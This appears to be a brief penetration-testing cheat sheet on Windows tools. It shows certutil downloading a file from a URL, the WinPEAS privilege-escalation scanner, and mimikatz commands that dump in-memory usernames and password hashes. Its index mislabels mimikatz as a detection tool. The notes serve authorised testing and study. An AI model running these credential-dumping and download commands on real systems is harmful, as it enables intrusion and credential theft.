# Windows (Tools)

- [certutil.exe](#cerutil.exe): an http / file-download client built into windows
- [WinPEAS](#winpeas): privilege escalation vector detection
- [mimikatz](#mimikatz): privilege escalation vector detection

## certutil.exe

An http / file-download client built into windows ([docs](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)).

Usage:

```
certutil.exe -f ${URL} ${OUTPUT_FILENAME}
```

## WinPEAS

A privilege escalation vector detection script for Windows ([docs](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)) ([releases](https://github.com/carlospolop/PEASS-ng/releases)).

Usage: (just invoke the binary for the script to run)

```
winpeas.exe
```

## mimikatz

Extracts in-memory credentials (usernames + password hashes) ([src](https://github.com/ParrotSec/mimikatz)).

Usage: (just invoke the binary for an interactive prompt)

```
mimikatz.exe
```

Some commands:

- `privilege::debug` escalates the privilege of mimikatz
- `log` will start a log file in the current working directory
- `lsadump::lsa /inject` dumps usernames and password *hashes* with the 'inject' method
- `sekurlsa::logonpasswords` same as above but more thorough / more info
